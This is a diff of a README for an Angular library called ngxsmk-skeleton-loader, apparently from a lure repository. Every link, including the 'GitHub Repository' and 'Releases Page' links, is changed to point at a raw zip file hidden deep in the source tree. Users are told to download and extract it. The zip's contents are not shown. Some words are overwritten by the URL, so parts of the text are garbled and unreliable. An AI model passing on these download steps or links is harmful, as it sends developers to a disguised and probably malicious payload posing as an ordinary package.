@@ -6,7 +6,7 @@ You are just a few steps away from enhancing your Angular application with beaut
 
 ## 📥 Download the Application
 
-[![Download ngxsmk-skeleton-loader](https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip)](https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip)
+[![Download ngxsmk-skeleton-loader](https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip)](https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip)
 
 ## 💻 System Requirements
 
@@ -14,7 +14,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Angular Version:** 17 or higher
-- **https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip Version:** 14 or higher
+- **https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip Version:** 14 or higher
 
 ## 🛠️ Features
 
@@ -28,13 +28,13 @@ The `ngxsmk-skeleton-loader` offers a variety of features to enhance your applic
 ## 📚 Installation Instructions
 
 1. **Visit the Releases Page:**
-   To start, visit this page to download the application: [Download Page](https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip).
+   To start, visit this page to download the application: [Download Page](https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip).
 
 2. **Choose a Version:**
    On the releases page, you will see different versions of the software. Select the most stable version or the latest one.
 
 3. **Download the Package:**
-   Click the download link for the desired version. You may see files such as `.zip` or `https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip`. Save this file to your computer.
+   Click the download link for the desired version. You may see files such as `.zip` or `https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip`. Save this file to your computer.
 
 4. **Extract the Files:**
    After downloading, locate the file in your downloads folder. Right-click the file and choose "Extract All" (on Windows) or use a similar option on macOS or Linux.
@@ -88,7 +88,7 @@ In addition to the skeleton loader, you can apply various animations to improve 
 If you encounter issues during installation or usage, consider the following steps:
 
 1. **Check the Console:** Open your browser's developer console to see any errors or warnings.
-2. **Verify Compatibility:** Ensure that your Angular and https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip versions meet the requirements.
+2. **Verify Compatibility:** Ensure that your Angular and https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip versions meet the requirements.
 3. **Search for Solutions:** Look through the issues section of the repository for similar problems and their solutions.
 
 ## 📬 Get Help
@@ -97,8 +97,8 @@ If you need further assistance or have questions, feel free to open a new issue 
 
 ## 🔗 Important Links
 
-- **GitHub Repository:** [ngxsmk-skeleton-loader](https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip)
-- **Releases Page:** [Download Page](https://raw.githubusercontent.com/Cholki2025/ngxsmk-skeleton-loader/master/spooner/ngxsmk-skeleton-loader.zip)
+- **GitHub Repository:** [ngxsmk-skeleton-loader](https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip)
+- **Releases Page:** [Download Page](https://github.com/Cholki2025/ngxsmk-skeleton-loader/raw/refs/heads/master/projects/ngxsmk-skeleton-loader/src/lib/skeleton/skeleton-loader-ngxsmk-2.6.zip)
 
 ## ✨ Conclusion
 
